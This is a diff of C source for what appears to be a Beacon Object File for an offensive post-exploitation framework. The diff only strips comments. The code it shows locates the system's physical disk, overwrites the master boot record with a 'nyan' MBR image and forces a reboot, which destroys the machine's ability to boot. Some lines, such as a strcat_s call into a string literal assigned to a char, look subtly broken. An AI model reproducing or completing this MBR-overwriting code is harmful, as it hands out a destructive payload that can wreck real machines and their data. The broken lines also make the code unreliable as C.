@@ -76,11 +76,9 @@ void go(char *args, int alen)
         return;
     }
 
-    // Str ops
     char volPath[4] = {sysDir[0], ':', '\\', '\0'};
     char devPath = strcat_s("\\\\.\\", 4, volPath);
 
-    // Open the volume
     if (strlen_s(volPath, 4) < 3 || volPath[1] != ':')
     {
         BeaconPrintf(CALLBACK_ERROR, "Invalid volume path: %s\n", volPath);
@@ -107,7 +105,6 @@ void go(char *args, int alen)
         return;
     }
 
-    // Open disk associated with the volume
     char physPath[MAX_PATH];
     if (snprintf_s(physPath, sizeof(physPath), "\\\\.\\PhysicalDrive%d", extents.Extents[0].DiskNumber) < 0)
     {
@@ -123,12 +120,10 @@ void go(char *args, int alen)
         return;
     }
 
-    // Write nyan to the MBR
     BeaconPrintf(CALLBACK_OUTPUT, "Overwriting MBR on disk %s\n", physPath);
     WriteFile(hDisk, nyan_mbr, nyan_mbr_len, NULL, NULL);
     CloseHandle(hDisk);
 
-    // Reboot the target machine to cause the MBR to be executed
     BeaconPrintf(CALLBACK_OUTPUT, "Rebooting the system to execute the new MBR...\n");
     CloseHandle(hVol);
     ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE);
